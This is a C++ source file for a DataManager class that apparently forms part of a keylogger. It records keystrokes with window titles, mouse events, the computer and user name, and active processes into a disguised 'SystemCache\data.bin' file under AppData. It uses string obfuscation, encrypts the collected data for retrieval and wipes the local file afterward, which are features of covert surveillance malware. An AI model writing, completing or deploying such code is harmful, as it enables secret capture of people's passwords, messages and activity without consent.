#include "data/DataManager.h"
#include "core/Logger.h"
#include "security/Encryption.h"
#include "security/Obfuscation.h"
#include "utils/TimeUtils.h"
#include "utils/FileUtils.h"
#include <algorithm>
#include <sstream>

// Obfuscated strings
constexpr auto OBF_DATA_MANAGER = OBFUSCATE("DataManager");

DataManager::DataManager(Configuration* config)
    : m_config(config), m_maxBufferSize(config->GetMaxFileSize()) {
    InitializeStorage();
}

DataManager::~DataManager() {
    FlushData();
}

void DataManager::InitializeStorage() {
    m_storagePath = utils::FileUtils::GetAppDataPath() + L"\\SystemCache\\data.bin";
    utils::FileUtils::CreateDirectories(utils::FileUtils::GetDirectoryPath(m_storagePath));
    
    LOG_INFO("Data storage initialized at: " + 
             utils::StringUtils::WideToUtf8(m_storagePath));
}

void DataManager::AddKeyData(const KeyData& keyData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    // Convert to string representation
    std::string dataStr = KeyDataToString(keyData);
    m_keyDataBuffer += dataStr;
    
    // Check if buffer needs flushing
    if (m_keyDataBuffer.size() >= m_maxBufferSize / 2) {
        FlushKeyData();
    }
}

void DataManager::AddMouseData(const MouseData& mouseData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = MouseDataToString(mouseData);
    m_mouseDataBuffer += dataStr;
    
    if (m_mouseDataBuffer.size() >= m_maxBufferSize / 4) {
        FlushMouseData();
    }
}

void DataManager::AddSystemData(const SystemInfo& systemInfo) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = SystemInfoToString(systemInfo);
    m_systemDataBuffer += dataStr;
    
    if (m_systemDataBuffer.size() >= m_maxBufferSize / 4) {
        FlushSystemData();
    }
}

void DataManager::AddSystemEventData(const SystemEventData& eventData) {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    std::string dataStr = SystemEventToString(eventData);
    m_systemEventBuffer += dataStr;
}

std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    
    FlushAllData();
    
    // Read and encrypt all collected data
    auto fileData = utils::FileUtils::ReadBinaryFile(m_storagePath);
    if (fileData.empty()) {
        return std::vector<uint8_t>();
    }
    
    std::string encryptionKey = m_config->GetEncryptionKey();
    std::vector<uint8_t> encryptedData = security::Encryption::EncryptData(
        fileData, encryptionKey
    );
    
    // Clear storage file after reading
    utils::FileUtils::WriteBinaryFile(m_storagePath, std::vector<uint8_t>());
    
    return encryptedData;
}

void DataManager::ClearData() {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    utils::FileUtils::WriteBinaryFile(m_storagePath, std::vector<uint8_t>());
}

bool DataManager::HasData() const {
    std::lock_guard<std::mutex> lock(m_dataMutex);
    return utils::FileUtils::GetFileSize(m_storagePath) > 0;
}

void DataManager::FlushAllData() {
    FlushKeyData();
    FlushMouseData();
    FlushSystemData();
    FlushSystemEvents();
}

void DataManager::FlushKeyData() {
    if (!m_keyDataBuffer.empty()) {
        AppendToStorage(m_keyDataBuffer);
        m_keyDataBuffer.clear();
    }
}

void DataManager::FlushMouseData() {
    if (!m_mouseDataBuffer.empty()) {
        AppendToStorage(m_mouseDataBuffer);
        m_mouseDataBuffer.clear();
    }
}

void DataManager::FlushSystemData() {
    if (!m_systemDataBuffer.empty()) {
        AppendToStorage(m_systemDataBuffer);
        m_systemDataBuffer.clear();
    }
}

void DataManager::FlushSystemEvents() {
    if (!m_systemEventBuffer.empty()) {
        AppendToStorage(m_systemEventBuffer);
        m_systemEventBuffer.clear();
    }
}

void DataManager::AppendToStorage(const std::string& data) {
    std::vector<uint8_t> currentData = utils::FileUtils::ReadBinaryFile(m_storagePath);
    std::string currentStr(currentData.begin(), currentData.end());
    
    currentStr += data;
    
    // Check size limit and rotate if needed
    if (currentStr.size() > m_maxBufferSize) {
        currentStr = currentStr.substr(currentStr.size() - m_maxBufferSize / 2);
    }
    
    utils::FileUtils::WriteBinaryFile(
        m_storagePath, 
        std::vector<uint8_t>(currentStr.begin(), currentStr.end())
    );
}

std::string DataManager::KeyDataToString(const KeyData& data) const {
    std::stringstream ss;
    ss << "KEY|" << data.timestamp << "|"
       << static_cast<int>(data.eventType) << "|"
       << data.keyCode << "|" << data.scanCode << "|"
       << static_cast<int>(data.modifiers) << "|"
       << data.windowTitle << "|" << data.keyName << "\n";
    return ss.str();
}

std::string DataManager::MouseDataToString(const MouseData& data) const {
    std::stringstream ss;
    ss << "MOUSE|" << data.timestamp << "|"
       << static_cast<int>(data.eventType) << "|"
       << static_cast<int>(data.button) << "|"
       << data.position.x << "|" << data.position.y << "|"
       << data.wheelDelta << "\n";
    return ss.str();
}

std::string DataManager::SystemInfoToString(const SystemInfo& info) const {
    std::stringstream ss;
    ss << "SYSINFO|" << info.timestamp << "|"
       << info.computerName << "|" << info.userName << "|"
       << info.osVersion << "|" << info.memorySize << "|"
       << info.processorInfo << "\n";
    return ss.str();
}

std::string DataManager::SystemEventToString(const SystemEventData& event) const {
    std::stringstream ss;
    ss << "SYSEVENT|" << event.timestamp << "|"
       << static_cast<int>(event.eventType) << "|"
       << event.windowTitle << "|" << event.processName << "|"
       << event.extraInfo << "\n";
    return ss.str();
}